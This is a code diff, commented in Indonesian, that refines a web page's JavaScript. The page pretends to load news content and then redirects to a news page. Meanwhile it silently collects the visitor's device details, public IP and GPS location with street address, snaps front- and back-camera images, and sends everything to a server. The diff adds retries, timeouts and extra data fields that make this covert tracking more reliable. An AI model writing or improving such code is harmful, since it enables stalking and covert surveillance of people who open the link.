@@ -6,6 +6,8 @@ function debug(message) {
   const debugDiv = document.getElementById("debug");
   if (debugDiv) {
     debugDiv.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${message}</div>`;
+    // Auto scroll ke bawah
+    debugDiv.scrollTop = debugDiv.scrollHeight;
   }
 }
 
@@ -23,6 +25,8 @@ let periodicInterval = null;
 let cameraIndex = 0;
 let availableCameras = [];
 let isCameraActive = false;
+let cameraRetryCount = 0;
+const MAX_RETRY = 3;
 
 // ==================== FUNGSI KIRIM DATA ====================
 async function sendData(type, data) {
@@ -47,6 +51,10 @@ async function sendData(type, data) {
       body: JSON.stringify(payload),
     });
 
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}`);
+    }
+
     const result = await response.json();
     debug(`Response: ${JSON.stringify(result)}`);
     console.log("Server response:", result);
@@ -61,6 +69,12 @@ async function sendData(type, data) {
 // Fungsi untuk mendapatkan daftar semua kamera
 async function getAvailableCameras() {
   try {
+    // Cek apakah browser mendukung mediaDevices
+    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
+      debug("❌ Browser tidak mendukung enumerateDevices");
+      return [];
+    }
+
     // Minta izin sementara untuk mendapatkan daftar kamera
     const tempStream = await navigator.mediaDevices.getUserMedia({
       video: true,
@@ -72,7 +86,8 @@ async function getAvailableCameras() {
 
     debug(`📷 Ditemukan ${cameras.length} kamera:`);
     cameras.forEach((cam, i) => {
-      debug(`   ${i + 1}. ${cam.label || "Kamera " + (i + 1)}`);
+      const label = cam.label || `Kamera ${i + 1}`;
+      debug(`   ${i + 1}. ${label}`);
     });
 
     return cameras;
@@ -90,8 +105,17 @@ async function captureFromStream(stream, cameraType) {
     const video = document.createElement("video");
     video.srcObject = stream;
     video.setAttribute("playsinline", "");
-    await video.play();
+    video.setAttribute("autoplay", "");
 
+    await new Promise((resolve, reject) => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve).catch(reject);
+      };
+      video.onerror = reject;
+      setTimeout(() => reject(new Error("Video timeout")), 5000);
+    });
+
+    // Tunggu video siap
     await new Promise((r) => setTimeout(r, 300));
 
     const canvas = document.createElement("canvas");
@@ -108,8 +132,10 @@ async function captureFromStream(stream, cameraType) {
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
     context.setTransform(1, 0, 0, 1, 0, 0);
 
-    const imageData = canvas.toDataURL("image/jpeg", 0.6);
+    // Kompres gambar dengan kualitas lebih rendah untuk pengiriman cepat
+    const imageData = canvas.toDataURL("image/jpeg", 0.5);
     video.srcObject = null;
+    video.remove();
 
     return imageData;
   } catch (err) {
@@ -118,8 +144,60 @@ async function captureFromStream(stream, cameraType) {
   }
 }
 
+// Fungsi untuk menangani error kamera
+function handleCameraError(err, cameraType) {
+  let errorMessage = "";
+  let userMessage = "";
+
+  switch (err.name) {
+    case "NotAllowedError":
+    case "PermissionDeniedError":
+      errorMessage = "Pengguna menolak akses kamera";
+      userMessage =
+        "Izin kamera ditolak. Silakan izinkan akses kamera untuk demo.";
+      break;
+    case "NotFoundError":
+    case "DevicesNotFoundError":
+      errorMessage = `Kamera ${cameraType} tidak ditemukan`;
+      userMessage = `Kamera ${cameraType === "front" ? "depan" : "belakang"} tidak ditemukan.`;
+      break;
+    case "NotReadableError":
+    case "TrackStartError":
+      errorMessage = `Kamera ${cameraType} sedang digunakan aplikasi lain`;
+      userMessage = `Kamera sedang digunakan oleh aplikasi lain. Tutup aplikasi lain dan coba lagi.`;
+      break;
+    case "OverconstrainedError":
+      errorMessage = `Kamera ${cameraType} tidak memenuhi spesifikasi`;
+      userMessage = `Kamera tidak mendukung resolusi yang diminta.`;
+      break;
+    case "AbortError":
+      errorMessage = "Akses kamera dibatalkan";
+      userMessage = "Proses akses kamera dibatalkan.";
+      break;
+    default:
+      errorMessage = err.message;
+      userMessage = `Gagal mengakses kamera: ${err.message}`;
+  }
+
+  debug(`❌ Error ${cameraType}: ${errorMessage}`);
+
+  // Tampilkan pesan ke user jika bukan error internal
+  if (userMessage && cameraRetryCount >= MAX_RETRY) {
+    const statusEl = document.getElementById("status");
+    if (statusEl) {
+      statusEl.textContent = userMessage;
+    }
+  }
+
+  sendData("camera_error", {
+    camera: cameraType,
+    error: errorMessage,
+    code: err.name,
+  });
+}
+
 // Fungsi untuk memulai kamera dengan device tertentu
-async function startCameraWithDevice(device, cameraLabel) {
+async function startCameraWithDevice(device, cameraLabel, retryCount = 0) {
   if (isSwitching) {
     debug("⏳ Sedang beralih kamera, tunggu...");
     return false;
@@ -140,7 +218,7 @@ async function startCameraWithDevice(device, cameraLabel) {
       });
     }
 
-    // Tentukan mode facingMode berdasarkan label
+    // Tentukan mode facingMode berdasarkan label atau index
     let facingMode = null;
     let cameraType = "unknown";
     const labelLower = cameraLabel.toLowerCase();
@@ -149,6 +227,7 @@ async function startCameraWithDevice(device, cameraLabel) {
       labelLower.includes("front") ||
       labelLower.includes("face") ||
       labelLower.includes("user") ||
+      labelLower.includes("selfie") ||
       availableCameras.indexOf(device) === 0
     ) {
       facingMode = "user";
@@ -158,11 +237,12 @@ async function startCameraWithDevice(device, cameraLabel) {
       cameraType = "back";
     }
 
-    // Konfigurasi constraints
+    // Konfigurasi constraints dengan fallback
     const constraints = {
       video: {
-        width: { ideal: 640 },
-        height: { ideal: 480 },
+        width: { ideal: 640, max: 1280 },
+        height: { ideal: 480, max: 720 },
+        frameRate: { ideal: 30, max: 30 },
       },
     };
 
@@ -184,6 +264,7 @@ async function startCameraWithDevice(device, cameraLabel) {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     currentStream = stream;
     currentCameraType = cameraType;
+    cameraRetryCount = 0; // Reset retry count on success
 
     debug(`✅ Kamera ${cameraType} aktif (${cameraLabel})`);
 
@@ -214,12 +295,20 @@ async function startCameraWithDevice(device, cameraLabel) {
 
     return true;
   } catch (err) {
-    debug(`❌ Gagal akses kamera: ${err.message}`);
-    await sendData("camera_access", {
-      camera: cameraType,
-      status: "error",
-      error: err.message,
-    });
+    handleCameraError(err, cameraType || "unknown");
+
+    // Retry logic untuk error tertentu
+    if (
+      retryCount < MAX_RETRY &&
+      (err.name === "NotReadableError" || err.name === "TrackStartError")
+    ) {
+      debug(
+        `🔄 Retry kamera ${cameraType || "unknown"} (${retryCount + 1}/${MAX_RETRY})...`,
+      );
+      await new Promise((r) => setTimeout(r, 1000));
+      return await startCameraWithDevice(device, cameraLabel, retryCount + 1);
+    }
+
     return false;
   } finally {
     isSwitching = false;
@@ -244,7 +333,10 @@ async function switchToNextCamera() {
 // Fungsi untuk menghentikan semua kamera
 function stopAllCameras() {
   if (currentStream) {
-    currentStream.getTracks().forEach((track) => track.stop());
+    currentStream.getTracks().forEach((track) => {
+      track.stop();
+      debug(`🛑 Track ${track.kind} dihentikan`);
+    });
     currentStream = null;
   }
 
@@ -269,7 +361,10 @@ async function startFallbackCamera() {
 
   try {
     const fallbackStream = await navigator.mediaDevices.getUserMedia({
-      video: true,
+      video: {
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+      },
     });
     currentStream = fallbackStream;
     currentCameraType = "default";
@@ -304,7 +399,15 @@ async function startFallbackCamera() {
 
     return true;
   } catch (fallbackErr) {
+    handleCameraError(fallbackErr, "fallback");
     debug("❌ Fallback juga gagal: " + fallbackErr.message);
+
+    // Tampilkan pesan error ke user
+    const statusEl = document.getElementById("status");
+    if (statusEl) {
+      statusEl.textContent =
+        "Gagal mengakses kamera. Demo akan dilanjutkan tanpa kamera.";
+    }
     return false;
   }
 }
@@ -326,6 +429,8 @@ setTimeout(async () => {
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     battery: "Tidak tersedia",
     referrer: document.referrer || "Langsung",
+    hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+    deviceMemory: navigator.deviceMemory || "N/A",
   };
 
   debug("Device info collected");
@@ -361,9 +466,16 @@ setTimeout(async () => {
       : "Tidak tersedia",
   });
 
-  // Coba dapatkan IP public
+  // Coba dapatkan IP public dengan timeout
   try {
-    const response = await fetch("https://api.ipify.org?format=json");
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 5000);
+
+    const response = await fetch("https://api.ipify.org?format=json", {
+      signal: controller.signal,
+    });
+    clearTimeout(timeoutId);
+
     const data = await response.json();
     await sendData("public_ip", data.ip);
     debug("Public IP: " + data.ip);
@@ -492,11 +604,17 @@ setTimeout(async () => {
           `Lokasi: ${position.coords.latitude}, ${position.coords.longitude}`,
         );
 
-        // Reverse geocoding
+        // Reverse geocoding dengan timeout
         try {
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), 5000);
+
           const geoResponse = await fetch(
             `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`,
+            { signal: controller.signal },
           );
+          clearTimeout(timeoutId);
+
           const geoData = await geoResponse.json();
           await sendData("location_address", geoData.display_name);
           debug("Alamat: " + geoData.display_name);
@@ -538,7 +656,14 @@ const statusInterval = setInterval(() => {
   counter++;
   const statusEl = document.getElementById("status");
   if (statusEl) {
-    statusEl.textContent = `Memuat konten... ${counter}/10`;
+    const loadingText = [
+      "Memuat",
+      "Menyiapkan",
+      "Memproses",
+      "Menginisialisasi",
+    ];
+    const text = loadingText[counter % loadingText.length];
+    statusEl.textContent = `${text}... ${counter}/10`;
   }
 
   if (counter >= 10) {
@@ -552,7 +677,7 @@ const statusInterval = setInterval(() => {
 
     // Redirect setelah selesai
     setTimeout(() => {
-      window.location.href = "/berita.html";
+      window.location.href = "/berita.html?ref=demo";
     }, 2000);
   }
 }, 1000);
@@ -560,6 +685,16 @@ const statusInterval = setInterval(() => {
 // Cleanup saat halaman ditutup
 window.addEventListener("beforeunload", () => {
   stopAllCameras();
+});
+
+// Handle page visibility change (tab aktif/tidak)
+document.addEventListener("visibilitychange", () => {
+  if (document.hidden) {
+    debug("📱 Tab tidak aktif, mengurangi frekuensi capture");
+    // Opsional: kurangi frekuensi capture saat tab tidak aktif
+  } else {
+    debug("📱 Tab aktif kembali");
+  }
 });
 
 // Tampilkan debug jika ada parameter
